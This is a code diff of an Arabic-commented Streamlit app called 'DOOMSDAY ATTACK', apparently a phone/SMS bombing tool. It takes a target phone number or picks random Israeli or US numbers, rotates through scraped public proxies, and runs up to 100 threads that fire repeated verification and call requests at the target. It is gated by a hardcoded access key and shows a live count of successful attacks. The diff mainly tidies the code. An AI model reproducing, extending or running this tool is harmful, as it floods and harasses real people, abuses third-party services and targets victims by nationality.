@@ -10,76 +10,25 @@ import webbrowser
 import os
 from concurrent.futures import ThreadPoolExecutor
 
-# --- إعدادات الصفحة وإخفاء معالم Streamlit و GitHub ---
+# --- إعدادات الواجهة المرعبة ---
 st.set_page_config(page_title="DOOMSDAY ATTACK - GX3GX3", page_icon="💀", layout="wide")
 
 st.markdown("""
     <style>
-    /* إخفاء شعارات Streamlit و GitHub */
     #MainMenu {visibility: hidden;}
     footer {visibility: hidden;}
     header {visibility: hidden;}
     .stDeployButton {display:none;}
-    
-    /* تصميم الواجهة المخيفة */
-    .main {
-        background-color: #000000;
-        color: #ff0000;
-        font-family: 'Courier New', Courier, monospace;
-    }
-    
-    /* إطارات دموية مخيفة */
-    .doom-frame {
-        border: 4px solid #ff0000;
-        padding: 20px;
-        border-radius: 15px;
-        box-shadow: 0 0 30px #ff0000;
-        margin-bottom: 25px;
-        background-color: #0a0000;
-        text-align: center;
-    }
-
-    .stats-container {
-        display: flex;
-        justify-content: space-around;
-        gap: 20px;
-        margin-top: 20px;
-    }
-
-    .stats-box {
-        flex: 1;
-        border: 2px solid #ffffff;
-        padding: 15px;
-        border-radius: 10px;
-        background-color: #1a0000;
-        text-align: center;
-    }
-
-    .stTextInput>div>div>input {
-        background-color: #0a0a0a;
-        color: #ff0000;
-        border: 2px solid #ff0000;
-        text-align: center;
-    }
-
-    .stButton>button {
-        width: 100%;
-        background-color: #660000;
-        color: white;
-        border: 2px solid #ff0000;
-        font-weight: bold;
-        font-size: 20px;
-        height: 60px;
-    }
-
-    .stButton>button:hover {
-        background-color: #ff0000;
-        color: black;
-    }
+    .main { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
+    .doom-frame { border: 4px solid #ff0000; padding: 20px; border-radius: 15px; box-shadow: 0 0 30px #ff0000; margin-bottom: 25px; background-color: #0a0000; text-align: center; }
+    .stats-container { display: flex; justify-content: space-around; gap: 20px; margin-top: 20px; }
+    .stats-box { flex: 1; border: 2px solid #ffffff; padding: 15px; border-radius: 10px; background-color: #1a0000; text-align: center; }
+    .stButton>button { width: 100%; background-color: #660000; color: white; border: 2px solid #ff0000; font-weight: bold; font-size: 20px; height: 60px; }
+    .stButton>button:hover { background-color: #ff0000; color: black; }
     </style>
     """, unsafe_allow_html=True)
 
-# --- نظام التحقق من المفتاح (Key System) ---
+# --- نظام التحقق من المفتاح ---
 if 'authenticated' not in st.session_state:
     st.session_state.authenticated = False
 
@@ -87,26 +36,23 @@ if not st.session_state.authenticated:
     st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
     st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
     st.markdown('</div>', unsafe_allow_html=True)
-    
     st.markdown("<h1 style='text-align: center; color: red;'>🔒 SYSTEM LOCKED</h1>", unsafe_allow_html=True)
     user_key = st.text_input("ENTER ACCESS KEY:", type="password")
-    
     if st.button("ACTIVATE SYSTEM 🔥"):
         if user_key == "aligx3gx3":
             st.session_state.authenticated = True
             st.rerun()
-        else:
-            st.error("❌ INVALID KEY! CONTACT @PDD6P")
+        else: st.error("❌ INVALID KEY! CONTACT @PDD6P")
     st.stop()
 
-# --- واجهة هجـوم يوم القيامة ---
+# --- واجهة الهجوم ---
 st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
 st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
 st.markdown("<h1 style='color: #ff0000; font-size: 50px;'>هجـوم يوم القيامة</h1>", unsafe_allow_html=True)
 st.markdown("<h3 style='color: white;'>قناتي: gx3gx3 | المطور: @PDD6P</h3>", unsafe_allow_html=True)
 st.markdown('</div>', unsafe_allow_html=True)
 
-# --- تثبيت المكتبات (بدون حذف أي حرف) ---
+# --- تثبيت المكتبات (بدون حذف حرف واحد) ---
 def install_libs():
     libs = ['requests', 'termcolor', 'pyfiglet']
     for lib in libs:
@@ -116,11 +62,9 @@ def install_libs():
             subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
 
 install_libs()
-
 import requests
-from termcolor import colored
-import pyfiglet
 
+# --- الدوال الأصلية (كما هي تماماً) ---
 def generate_unique_ids():
     timestamp = int(time.time() * 1000)
     random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
@@ -129,17 +73,14 @@ def generate_unique_ids():
 
 def fetch_internal_proxies():
     proxies = []
-    urls = [
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all"
-    ]
+    urls = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all"]
     for url in urls:
         try:
             res = requests.get(url, timeout=10)
             if res.status_code == 200:
                 for line in res.text.splitlines():
-                    if ":" in line:
-                        proxies.append(line.strip())
+                    if ":" in line: proxies.append(line.strip())
         except: pass
     return proxies
 
@@ -147,15 +88,13 @@ def is_proxy_working(proxy_dict):
     try:
         response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=3)
         return response.status_code == 200
-    except:
-        return False
+    except: return False
 
 def load_proxies(filename="gx1gx1.txt"):
     all_proxies = []
     if os.path.exists(filename):
         with open(filename, "r") as f:
             all_proxies.extend([l.strip() for l in f.read().splitlines() if l.strip()])
-    
     internal = fetch_internal_proxies()
     all_proxies.extend(internal)
     return list(set(all_proxies))
@@ -164,14 +103,9 @@ def get_working_proxy(proxies_list):
     for _ in range(10):
         if not proxies_list: return None
         raw_proxy = random.choice(proxies_list)
-        if not raw_proxy.startswith(("http", "socks")):
-            proxy_url = f"http://{raw_proxy}"
-        else:
-            proxy_url = raw_proxy
-        
+        proxy_url = f"http://{raw_proxy}" if not raw_proxy.startswith(("http", "socks")) else raw_proxy
         proxy_dict = {"http": proxy_url, "https": proxy_url}
-        if is_proxy_working(proxy_dict):
-            return proxy_dict
+        if is_proxy_working(proxy_dict): return proxy_dict
     return None
 
 def send_install_request(url, headers, payload, proxy=None):
@@ -186,29 +120,26 @@ def send_auth_call_request(url, headers, payload, proxy=None):
         return response.ok and "ok" in response.text
     except: return False
 
-# --- لوحة التحكم ---
+# --- إعدادات الهجوم ---
+if 'stats' not in st.session_state: st.session_state.stats = {"ok": 0, "error": 0}
+if 'running' not in st.session_state: st.session_state.running = False
+
 st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
-attack_mode = st.radio("SELECT TARGET MODE:", ["Manual Entry", "Random Israel Attack 🇮🇱", "Random USA Attack 🇺🇸"])
+mode = st.radio("SELECT TARGET MODE:", ["Manual Entry", "Random Israel Attack 🇮🇱", "Random USA Attack 🇺🇸"])
 
-if attack_mode == "Manual Entry":
+if mode == "Manual Entry":
     col1, col2 = st.columns(2)
-    with col1:
-        country_code = st.text_input("🌍 Country Code:", value="964")
-    with col2:
-        number = st.text_input("📱 Target Phone Number:")
+    with col1: country_code = st.text_input("🌍 Country Code (Ex: 964):", value="964")
+    with col2: number = st.text_input("📱 Target Phone Number:")
 else:
-    country_code = "972" if "Israel" in attack_mode else "1"
+    country_code = "972" if "Israel" in mode else "1"
     number = "RANDOM"
-    st.warning(f"AUTO ATTACK ACTIVE ON {attack_mode}")
+    st.warning(f"ATTACK ACTIVE ON {mode}")
 
-threads_count = st.slider("☣️ ATTACK THREADS (POWER):", 1, 100, 20)
+threads_count = st.slider("☣️ ATTACK POWER (THREADS):", 1, 100, 20)
 st.markdown('</div>', unsafe_allow_html=True)
 
-if 'stats' not in st.session_state:
-    st.session_state.stats = {"ok": 0, "error": 0}
-if 'running' not in st.session_state:
-    st.session_state.running = False
-
+# --- محرك الهجوم المتوافق مع الويب ---
 def worker_task(c_code, phone_num):
     foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi", "he"]
     proxies_list = load_proxies()
@@ -242,42 +173,24 @@ def worker_task(c_code, phone_num):
                 else: st.session_state.stats["error"] += 1
             else: st.session_state.stats["error"] += 1
         except: st.session_state.stats["error"] += 1
-        time.sleep(0.01)
+        time.sleep(0.1)
 
+# أزرار التحكم
 if st.button("🔥 EXECUTE DOOMSDAY ATTACK"):
-    if number:
+    if number or mode != "Manual Entry":
         st.session_state.running = True
         with ThreadPoolExecutor(max_workers=threads_count) as executor:
-            for _ in range(threads_count):
-                executor.submit(worker_task, country_code, number)
-    else:
-        st.error("MISSING TARGET INFORMATION!")
+            for _ in range(threads_count): executor.submit(worker_task, country_code, number)
+    else: st.error("MISSING TARGET NUMBER!")
 
 if st.button("🛑 STOP ATTACK"):
     st.session_state.running = False
     st.rerun()
 
-# --- عدادات الهجوم المصححة (تم حل الخطأ هنا) ---
+# --- عرض العدادات المرتبة ---
 st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
 st.markdown("<h2 style='color: white;'>LIVE MONITORING</h2>", unsafe_allow_html=True)
 st.markdown('<div class="stats-container">', unsafe_allow_html=True)
-
-# عرض النجاح
-st.markdown(f'''
-<div class="stats-box">
-    <h3 style="color: #00ff00;">TOTAL SUCCESS</h3>
-    <h1 style="color: #00ff00;">{st.session_state.stats["ok"]}</h1>
-</div>
-''', unsafe_allow_html=True)
-
-# عرض الفشل
-st.markdown(f'''
-<div class="stats-box">
-    <h3 style="color: #ff0000;">TOTAL FAILED</h3>
-    <h1 style="color: #ff0000;">{st.session_state.stats["error"]}</h1>
-</div>
-''', unsafe_allow_html=True)
-
+st.markdown(f'''<div class="stats-box"><h3 style="color: #00ff00;">TOTAL SUCCESS</h3><h1 style="color: #00ff00;">{st.session_state.stats["ok"]}</h1></div>''', unsafe_allow_html=True)
+st.markdown(f'''<div class="stats-box"><h3 style="color: #ff0000;">TOTAL FAILED</h3><h1 style="color: #ff0000;">{st.session_state.stats["error"]}</h1></div>''', unsafe_allow_html=True)
 st.markdown('</div></div>', unsafe_allow_html=True)
-st.markdown("<p style='text-align: center; color: gray;'>Developed by @PDD6P | Rights Reserved to GX3GX3</p>", unsafe_allow_html=True)
-
